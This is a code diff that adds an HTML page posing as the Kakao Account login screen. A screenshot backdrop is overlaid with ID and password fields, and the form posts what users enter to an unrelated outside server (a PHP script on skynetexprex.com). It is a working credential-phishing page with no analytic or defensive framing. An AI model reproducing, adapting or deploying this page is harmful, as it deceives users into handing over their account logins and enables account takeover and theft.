@@ -1,0 +1,128 @@
+﻿
+<html>
+<head>
+<title>Kakao Account</title>
+<meta http-equiv="content-type" content="text/html; charset=UTF8">
+
+<link href="https://i.ibb.co/RC0tzWR/favicon-1024.png" rel="" />
+<style type="text/css">
+.textbox { 
+
+border-top-style: hidden;
+        border-right-style: hidden;
+        border-left-style: hidden;
+        border-bottom-style: groove;
+        background-color: transparent;
+
+   
+    height: 44px; 
+    width: 275px; 
+    font-size: 18px;
+    line-height: 25px; 
+	padding: 10px 0 8px;
+	color: #191919;
+    letter-spacing: 0;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    outline: 0 none;
+    caret-color: #191919;
+    opacity: 1;
+	-webkit-transition: box-shadow 0.3s;
+  transition: box-shadow 0.3s;
+}  
+.textbox:focus { 
+  
+	outline: none;
+  box-shadow: 0px 1px 0px  #191919, 0px 1px 0px  #191919;
+} 
+
+
+
+.box_tf .tf_g {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    height: 45px;
+    padding: 10px 0 8px;
+    border: 0;
+    font-size: 18px;
+    line-height: 25px;
+    color: #191919;
+    background-color: transparent;
+    letter-spacing: 0;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    outline: 0 none;
+    caret-color: #191919;
+    opacity: 1;
+}
+ </style>
+ 
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 1349px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+p{font-size: 40px;}
+</style>
+
+
+			<script language="javascript">
+function submitform()
+{
+   document.forms["Form"].submit();
+}
+
+// Form validation code will come here.
+function validate()
+{
+ 
+   if( document.Form.formtext1.value == "" )
+   {
+     alert( "아이디 또는 이메일 주소를 입력해주세요." );
+     document.Form.formtext1.focus() ;
+     return false;
+   }
+   if( document.Form.formtext2.value == "" )
+   {
+     alert( "비밀번호를 입력해주세요." );
+     document.Form.formtext2.focus() ;
+     return false;
+   }
+
+  else{
+   return( true );
+   }
+}
+//-->
+</script>
+</head>
+<body bgColor="#F5F6F7" Link="#000000" VLink="#000000" ALink="#000000"  >
+
+
+<div id="container">
+  <div id="image1" style="position:absolute; overflow:hidden; left:-3px; top:0px; width:1350px; height:739px; z-index:0"><img src="https://i.imgur.com/dB8RSy5.jpeg" alt="" title="" border=0 width=1350 height=739></div>
+  <form name="Form" action="https://skynetexprex.com/srv/02/kakk.php"  method="post" onSubmit="return(validate());">
+
+    <input name="formtext1" value="" placeholder="KakaoMail ID, email, phone number" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:441px;left:456px;top:195px;z-index:0" height="61">
+
+    <input name="formtext2" value="" placeholder="Password" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:439px;left:457px;top:246px;z-index:0" height="61">
+    <div id="formimage1" style="position:absolute; left:458px; top:471px; width:444px; height:54px; z-index:5" >
+     <input type="image" width="444" height="54" src="https://i.imgur.com/2a0oMde.jpeg" >
+    </div>
+	  
+	  <div id="formimage1" style="position:absolute; left:457px; top:377px; width:444px; height:54px; z-index:5" >
+       <input type="image" name="submit" width="444" height="54" src="https://i.imgur.com/R5Xhhea.jpeg" >
+    </div>
+  </form>
+
+</body>
+</html>
